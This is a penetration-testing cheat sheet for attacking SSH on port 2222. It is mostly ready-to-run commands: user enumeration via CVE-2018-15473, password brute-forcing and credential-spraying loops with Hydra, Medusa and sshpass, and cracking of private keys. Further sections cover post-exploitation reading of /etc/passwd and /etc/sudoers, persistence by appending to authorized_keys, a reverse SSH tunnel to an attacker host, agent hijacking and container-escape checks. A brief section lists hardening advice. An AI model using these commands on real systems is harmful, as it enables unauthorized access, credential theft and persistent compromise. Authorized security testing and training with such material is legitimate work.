# ALTERNATIVE SSH ENUMERATION (Port 2222)

## SERVICE OVERVIEW
```
Port 2222 is commonly used as an alternative SSH port
- Non-standard SSH port (default is 22)
- Often used to avoid automated attacks
- Same SSH protocol as port 22
- May indicate security-conscious admin or honeypot
- All SSH enumeration techniques apply
```

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sV -p2222 <IP>                             # Service/Version detection
nc -nv <IP> 2222                                 # Manual banner grab
telnet <IP> 2222                                 # Alternative banner grab
ssh -v <IP> -p 2222                              # Verbose SSH connection
```

## SSH ENUMERATION
```bash
# Get SSH banner
nc <IP> 2222

# SSH version detection
ssh -V <IP> -p 2222
nmap -sV -p2222 <IP>

# Algorithm enumeration
nmap --script ssh2-enum-algos -p2222 <IP>
ssh -vv <IP> -p 2222 2>&1 | grep -i "kex\|cipher\|mac"

# Host key enumeration
nmap --script ssh-hostkey -p2222 <IP>
ssh-keyscan -p 2222 <IP>
```

## USER ENUMERATION
```bash
# OpenSSH < 7.7 - CVE-2018-15473
nmap --script ssh-auth-methods --script-args="ssh.user=root" -p2222 <IP>
python3 ssh-user-enum.py --port 2222 --userList users.txt <IP>

# Timing-based enumeration
for user in root admin test user; do
    echo "Testing: $user"
    time ssh -o PreferredAuthentications=none -p 2222 $user@<IP>
done
```

## BRUTE FORCE ATTACKS
```bash
# Hydra
hydra -l root -P passwords.txt ssh://<IP>:2222
hydra -L users.txt -P passwords.txt ssh://<IP>:2222
hydra -l admin -P rockyou.txt -t 4 ssh://<IP>:2222  # Limit threads

# Medusa
medusa -h <IP> -n 2222 -u root -P passwords.txt -M ssh
medusa -h <IP> -n 2222 -U users.txt -P passwords.txt -M ssh

# Nmap
nmap -p2222 --script ssh-brute --script-args userdb=users.txt,passdb=passwords.txt <IP>

# Patator
patator ssh_login host=<IP> port=2222 user=FILE0 password=FILE1 0=users.txt 1=passwords.txt -x ignore:mesg='Authentication failed'
```

## DEFAULT CREDENTIALS
```bash
# Common default credentials
root:root
root:toor
root:password
admin:admin
pi:raspberry
ubuntu:ubuntu

# Test defaults
for user in root admin pi ubuntu; do
    for pass in root admin password raspberry; do
        sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -p 2222 $user@<IP> "whoami" 2>/dev/null && echo "[+] Valid: $user:$pass"
    done
done
```

## SSH KEY AUTHENTICATION
```bash
# Test with found private keys
chmod 600 id_rsa
ssh -i id_rsa -p 2222 user@<IP>

# Test publickey acceptance
nmap --script ssh-publickey-acceptance --script-args="ssh.user=root,ssh.publickey=id_rsa.pub" -p2222 <IP>

# Crack encrypted SSH keys
ssh2john id_rsa > id_rsa.hash
john --wordlist=rockyou.txt id_rsa.hash
```

## VULNERABILITY SCANNING
```bash
# Search for SSH exploits
searchsploit openssh
searchsploit ssh

# Common SSH vulnerabilities
# CVE-2018-15473: User enumeration
# CVE-2016-20012: MaxAuthTries bypass
# CVE-2015-5600: MaxAuthTries bypass + user enum

# Nmap vuln scan
nmap -p2222 --script vuln <IP>
nmap -p2222 --script ssh-* <IP>

# Check for weak algorithms
nmap --script ssh2-enum-algos -p2222 <IP> | grep -E "arcfour|cbc|md5|sha1|diffie-hellman-group1"
```

## PORT FORWARDING & TUNNELING
```bash
# Local port forwarding
ssh -L 8080:localhost:80 -p 2222 user@<IP>

# Remote port forwarding
ssh -R 8080:localhost:80 -p 2222 user@<IP>

# Dynamic port forwarding (SOCKS proxy)
ssh -D 1080 -p 2222 user@<IP>
proxychains nmap -sT <target>

# SSH tunnel for pivoting
ssh -L 3389:192.168.1.100:3389 -p 2222 user@<IP>  # RDP tunnel
```

## HONEYPOT DETECTION
```bash
# Port 2222 may be a honeypot!
# Check for suspicious behavior:

# 1. Accepts all passwords
sshpass -p "wrongpassword123" ssh -p 2222 test@<IP> "whoami"
# If succeeds = likely honeypot

# 2. Unusual banner
nc <IP> 2222
# Look for generic/fake banners

# 3. Delayed responses
time ssh -p 2222 user@<IP>
# Honeypots often introduce artificial delays

# 4. Check service behavior
ssh -p 2222 user@<IP> "uname -a"
# Inconsistent OS info = honeypot
```

## METASPLOIT MODULES
```bash
msfconsole
use auxiliary/scanner/ssh/ssh_version            # Version detection
use auxiliary/scanner/ssh/ssh_login              # Login scanner
use auxiliary/scanner/ssh/ssh_enumusers          # User enumeration (CVE-2018-15473)
set RHOSTS <IP>
set RPORT 2222
run
```

## CONFIGURATION ANALYSIS
```bash
# After gaining access, check SSH config
cat /etc/ssh/sshd_config | grep -v "^#" | grep -v "^$"

# Important settings:
grep "Port" /etc/ssh/sshd_config                 # Should show 2222
grep "PermitRootLogin" /etc/ssh/sshd_config
grep "PasswordAuthentication" /etc/ssh/sshd_config
grep "PubkeyAuthentication" /etc/ssh/sshd_config
```

## WHY PORT 2222?
```
Common reasons for SSH on port 2222:
1. Security by obscurity (avoid automated attacks on 22)
2. Multiple SSH services on same host
3. Docker container SSH (often uses 2222)
4. Firewall/NAT configuration
5. Compliance requirements
6. Honeypot deployment
7. Admin preference/convention
```

## COMMON MISCONFIGURATIONS
```
☐ PermitRootLogin yes                            # Root can login directly
☐ PasswordAuthentication yes                     # Brute force possible
☐ Weak passwords                                 # Easy to crack
☐ Old OpenSSH version                            # Known vulnerabilities
☐ Weak ciphers enabled                           # Cryptographic attacks
☐ No fail2ban/rate limiting                      # Brute force not mitigated
☐ Same as issues on port 22                      # Security through obscurity failed
```

## QUICK WIN CHECKLIST
```
☐ Banner grab for version
☐ Test default credentials (root:root, admin:admin, pi:raspberry)
☐ User enumeration (CVE-2018-15473 if < OpenSSH 7.7)
☐ Check for weak algorithms/ciphers
☐ Brute force with common passwords
☐ Search for version-specific exploits
☐ Test found SSH keys
☐ Check if honeypot
☐ Attempt password spraying
☐ Look for SSH keys in web directories
```

## ONE-LINER FULL ENUMERATION
```bash
# Comprehensive SSH scan on port 2222
nmap -sV -p2222 --script "ssh-* and not ssh-brute" -oA ssh_2222_enum <IP>

# Quick version check
nc <IP> 2222 | head -n 1

# Test common credentials
for pass in root admin password; do sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -p 2222 root@<IP> "whoami" 2>/dev/null && echo "[+] root:$pass"; done
```

## POST-EXPLOITATION
```bash
# After successful SSH access

# Information gathering
whoami && id && hostname
uname -a
cat /etc/issue
cat /etc/passwd
ps aux
netstat -tulpn

# Check why SSH is on port 2222
cat /etc/ssh/sshd_config | grep Port
ps aux | grep sshd
netstat -tlpn | grep sshd

# Privilege escalation
sudo -l
find / -perm -4000 2>/dev/null
cat /etc/sudoers

# Persistence
echo "ssh_public_key" >> ~/.ssh/authorized_keys
```

## DOCKER SSH DETECTION
```bash
# Port 2222 often used in Docker containers

# Detect if in Docker container
cat /.dockerenv                                  # Exists in Docker
cat /proc/1/cgroup | grep docker                 # Shows docker
hostname                                         # Often random hex

# Container escape techniques (if in Docker)
# Check for privileged container
fdisk -l                                         # Shows host disks if privileged
docker ps                                        # If docker socket mounted

# Look for mounted docker socket
ls -la /var/run/docker.sock                      # If exists = potential escape
```

## SECURITY IMPLICATIONS
```
SECURITY NOTES:
1. Port 2222 != More secure (security by obscurity)
2. Same vulnerabilities as port 22
3. May indicate:
   - Security-conscious admin (good)
   - Docker/container environment
   - Multiple SSH services
   - Honeypot (be careful!)
4. Automated scanners will still find it
5. All SSH best practices still apply

RECOMMENDATION:
- Use key-based authentication
- Disable root login
- Implement fail2ban
- Update to latest OpenSSH
- Use strong ciphers only
- Monitor access logs
- Consider VPN instead
```

## COMPARISON: PORT 22 VS 2222
```
Port 22 (Default):
- Standard SSH port
- More automated attacks
- Everyone expects it
- Default in all configs

Port 2222 (Alternative):
- Non-standard port
- Fewer automated attacks
- May confuse attackers
- Requires explicit configuration
- Often in Docker/containers
- Same security level (protocol identical)
- "Security by obscurity" - NOT real security
```

## ADVANCED TECHNIQUES
```bash
# SSH through HTTP proxy
ssh -o "ProxyCommand=nc -X connect -x proxy:8080 %h %p" -p 2222 user@<IP>

# SSH with specific cipher
ssh -c aes256-ctr -p 2222 user@<IP>

# SSH multiplexing (connection reuse)
ssh -M -S /tmp/ssh-socket -p 2222 user@<IP>      # Master
ssh -S /tmp/ssh-socket user@<IP>                 # Reuse

# Reverse SSH tunnel
ssh -R 2222:localhost:22 -p 2222 attacker@<attacker_IP>  # On target
ssh -p 2222 user@localhost                       # On attacker

# SSH agent forwarding exploitation
ssh -A -p 2222 user@<IP>                         # Forward agent
# Then hijack agent on compromised server
```

## ALL SSH ENUMERATION APPLIES
```
This port uses SSH protocol, so ALL techniques from "22 SSH.md" apply:
- Banner grabbing
- Version detection
- User enumeration
- Brute forcing
- Key authentication
- Vulnerability scanning
- Port forwarding
- Tunneling
- Post-exploitation
- Configuration analysis

ONLY DIFFERENCE: Use -p 2222 flag!
```
